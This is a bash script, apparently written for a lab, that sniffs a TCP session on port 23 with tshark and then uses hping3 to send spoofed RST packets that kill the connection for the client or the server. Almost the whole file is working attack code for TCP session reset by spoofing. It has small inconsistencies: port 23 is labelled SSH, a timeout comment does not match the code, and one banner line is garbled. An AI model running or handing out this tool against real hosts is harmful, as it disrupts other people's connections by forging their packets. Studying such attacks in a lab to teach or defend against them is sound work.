#!/bin/bash

# ================= CONFIGURATION =================
IFACE="enp0s3"         # CHANGE THIS to your interface (check ip a)
PORT=23              # SSH Port
STABILIZE_TIME=50    # Seconds to wait for silence
LAST_PKT_FILE="/tmp/last_packet_info.txt"
# ====================np0s3=============================

# Check for root
if [ "$EUID" -ne 0 ]; then
  echo "[-] Please run as root."
  exit 1
fi

echo "[*] Monitoring SSH (Port $PORT) on $IFACE..."
echo "[*] Waiting for FIRST packet to start the timer..."

# Cleanup
rm -f "$LAST_PKT_FILE"

silence_counter=0
first_packet_seen=false

# We use process substitution to feed tshark output into the loop
# We capture specific fields:
# 0:IP_SRC, 1:IP_DST, 2:TCP_SPORT, 3:TCP_DPORT, 4:TCP_SEQ, 5:TCP_ACK, 6:TCP_LEN
# 7-15: IP Header fields
# 16-20: TCP Header fields

while read -t 20 -a FIELDS; do
    # 'read -t 1' returns 0 if packet arrives, >128 if timeout (1 second passes)

    if [ $? -eq 0 ]; then
        # === PACKET DETECTED ===
        
        if [ "$first_packet_seen" = false ]; then
            echo "[!] First SSH packet detected! Monitoring for stabilization..."
            first_packet_seen=true
        fi

        # Reset silence counter because activity occurred
        silence_counter=0
        
        # Save packet info for the kill phase later
        echo "${FIELDS[@]}" > "$LAST_PKT_FILE"
        
        # Extract basic fields for logic
        TCP_PAYLOAD_LEN=${FIELDS[6]}
        
        # Check if Control Packet (No Data) -> Display Headers
        # If payload length is 0 or empty
        LEN="${TCP_PAYLOAD_LEN:-0}"
        
        if [ "$LEN" -eq 0 ]; then
            echo "---------------------------------------------------------------"
            echo "[!] Control Packet (No Data) - Displaying Headers:"
            echo "    [IP] Src: ${FIELDS[0]} -> Dst: ${FIELDS[1]}"
            echo "    [IP] Ver:${FIELDS[7]} IHL:${FIELDS[8]} TOS:${FIELDS[9]} Len:${FIELDS[10]} ID:${FIELDS[11]} Flags:${FIELDS[12]} TTL:${FIELDS[13]} Proto:${FIELDS[14]} Chk:${FIELDS[15]}"
            echo "    [TCP] Sport:${FIELDS[2]} Dport:${FIELDS[3]} Seq:${FIELDS[4]} Ack:${FIELDS[5]} Len:${FIELDS[16]} Flags:${FIELDS[17]} Win:${FIELDS[18]} Chk:${FIELDS[19]} Urg:${FIELDS[20]}"
            echo "---------------------------------------------------------------"
        else
            # Just a dot for data packets to keep screen clean
            echo -n "."
        fi

    else
        # === NO PACKET (TIMEOUT) ===
        
        # Only start counting silence IF we have seen at least one packet
        if [ "$first_packet_seen" = true ]; then
            ((silence_counter++))
            echo -ne "\r[*] Silence: $silence_counter / $STABILIZE_TIME seconds   "
            
            if [ "$silence_counter" -ge "$STABILIZE_TIME" ]; then
                echo ""
                echo "[+] Connection Stabilized! ($STABILIZE_TIME seconds of silence)"
                break
            fi
        else
            # Waiting for the session to actually start
            echo -ne "\r[*] Waiting for SSH traffic to begin...   "
        fi
    fi

done < <(tshark -i "$IFACE" -l -n \
    -Y "tcp.port == $PORT" \
    -T fields \
    -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e tcp.seq -e tcp.ack -e tcp.len \
    -e ip.version -e ip.hdr_len -e ip.dsfield -e ip.len -e ip.id -e ip.flags -e ip.ttl -e ip.proto -e ip.checksum \
    -e tcp.hdr_len -e tcp.flags -e tcp.window_size_value -e tcp.checksum -e tcp.urgent_pointer 2>/dev/null)

# ================= KILL PHASE =================

if [ ! -f "$LAST_PKT_FILE" ]; then
    echo "[-] No packets captured. Exiting."
    exit 1
fi

# Load last packet data
read -a LAST_PKT < "$LAST_PKT_FILE"

L_SRC=${LAST_PKT[0]}
L_DST=${LAST_PKT[1]}
L_SPORT=${LAST_PKT[2]}
L_DPORT=${LAST_PKT[3]}
L_SEQ=${LAST_PKT[4]}
L_ACK=${LAST_PKT[5]}
L_LEN=${LAST_PKT[6]:-0}

echo ""
echo "=========================================="
echo "Last Packet Seen:"
echo "$L_SRC:$L_SPORT -> $L_DST:$L_DPORT"
echo "SEQ: $L_SEQ | ACK: $L_ACK | LEN: $L_LEN"
echo "=========================================="
echo ""
echo "Which party do you want to kill?"
echo "1) Client"
echo "2) Server"
read -p "Select (1/2): " CHOICE

# === CALCULATE SEQUENCES ===
# We need to determine "Who is who" relative to the last packet seen.
# If Last Packet was Server -> Client (Sport 23), then:
#   - To kill Client: We act as Server. Target=ClientIP. Seq = Ack (from last packet).
#   - To kill Server: We act as Client. Target=ServerIP. Seq = Seq + Len (from last packet).

if [ "$L_SPORT" -eq 23 ]; then
    # Case A: Last Packet came from SERVER
    SERVER_IP=$L_SRC
    CLIENT_IP=$L_DST
    SERVER_PORT=23
    CLIENT_PORT=$L_DPORT # Random high port
    
    # Values derived from the Server's packet
    PKT_SEQ=$L_SEQ
    PKT_ACK=$L_ACK
    PKT_LEN=$L_LEN
    
    # If we want to kill Client, we spoof Server.
    # We send RST with SEQ = PKT_ACK (what client expects next from server)
    SEQ_TO_KILL_CLIENT=$PKT_ACK
    
    # If we want to kill Server, we spoof Client.
    # We send RST with SEQ = PKT_SEQ + PKT_LEN (what server expects next from client acts as ACK for this packet)
    SEQ_TO_KILL_SERVER=$(($PKT_SEQ + $PKT_LEN))

else
    # Case B: Last Packet came from CLIENT
    CLIENT_IP=$L_SRC
    SERVER_IP=$L_DST
    CLIENT_PORT=$L_SPORT # Random high port
    SERVER_PORT=23
    
    PKT_SEQ=$L_SEQ
    PKT_ACK=$L_ACK
    PKT_LEN=$L_LEN

    # If we want to kill Client, we spoof Server.
    SEQ_TO_KILL_CLIENT=$(($PKT_SEQ + $PKT_LEN))
    
    # If we want to kill Server, we spoof Client.
    SEQ_TO_KILL_SERVER=$PKT_ACK
fi

# === EXECUTE ATTACK ===

if [ "$CHOICE" == "1" ]; then
    echo "[*] Killing Client ($CLIENT_IP)..."
    # Target: Client IP, Client Port
    # Spoof:  Server IP, Server Port
    sudo hping3 "$CLIENT_IP" \
        -a "$SERVER_IP" \
        -s "$SERVER_PORT" \
        -p "$CLIENT_PORT" \
        -R -A -M "$SEQ_TO_KILL_CLIENT" \
        -c 3 >/dev/null 2>&1

elif [ "$CHOICE" == "2" ]; then
    echo "[*] Killing Server ($SERVER_IP)...client ip "
    # Target: Server IP, Server Port
    # Spoof:  Client IP, Client Port
    sudo hping3 "$SERVER_IP" \
        -a "$CLIENT_IP" \
        -s "$CLIENT_PORT" \
        -p "$SERVER_PORT" \
        -R -A -M "$SEQ_TO_KILL_SERVER" \
        -c 3 >/dev/null 2>&1
else
    echo "[-] Invalid Selection."
    exit 1
fi

echo "[✔] RST Packets Sent."